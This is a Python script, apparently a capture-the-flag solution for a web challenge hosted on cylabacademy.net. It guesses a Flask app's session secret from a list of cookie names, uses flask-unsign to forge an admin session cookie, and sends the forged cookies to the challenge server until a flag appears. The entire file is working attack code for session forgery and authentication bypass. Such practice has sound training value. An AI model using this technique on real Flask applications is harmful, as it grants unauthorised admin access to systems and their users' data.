import subprocess
import requests

def sign_cookie_with_secrets(secrets, cookie_data="{'very_auth': 'admin'}"):

    signed_cookies = {}

    for secret in secrets:
        try:
            command = [
                r'C:\Users\vedan\AppData\Roaming\Python\Python313\Scripts\flask-unsign.exe',
                '--sign',
                '--cookie', cookie_data,
                '--secret', secret
            ]

            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                check=True
            )

            signed_cookies[secret] = result.stdout.strip()

        except subprocess.CalledProcessError as e:
            signed_cookies[secret] = f"Error: {e.stderr.strip()}"

    return signed_cookies


def check_cookies_for_flag(signed_cookies):

    target_url = 'http://xebec.cylabacademy.net:23941//display'

    for secret, signed_cookie in signed_cookies.items():
        try:
            cookies = {'session': signed_cookie}

            response = requests.get(
                target_url,
                cookies=cookies,
                allow_redirects=False
            )

            if response.status_code == 302:
                continue

            if 'academy' in response.text:
                print(
                    f"Secret: {secret}\n"
                    f"Signed Cookie: {signed_cookie}\n"
                    f"Response Text: {response.text}\n"
                )
                exit()

        except Exception as e:
            print(f"Error with secret '{secret}': {e}")


if __name__ == "__main__":

    secrets = [
        "snickerdoodle",
        "chocolate chip",
        "oatmeal raisin",
        "gingersnap",
        "shortbread",
        "peanut butter",
        "whoopie pie",
        "sugar",
        "molasses",
        "kiss",
        "biscotti",
        "butter",
        "spritz",
        "snowball",
        "drop",
        "thumbprint",
        "pinwheel",
        "wafer",
        "macaroon",
        "fortune",
        "crinkle",
        "icebox",
        "gingerbread",
        "tassie",
        "lebkuchen",
        "macaron",
        "black and white",
        "white chocolate macadamia"
    ]

    signed_cookies = sign_cookie_with_secrets(secrets)

    check_cookies_for_flag(signed_cookies)
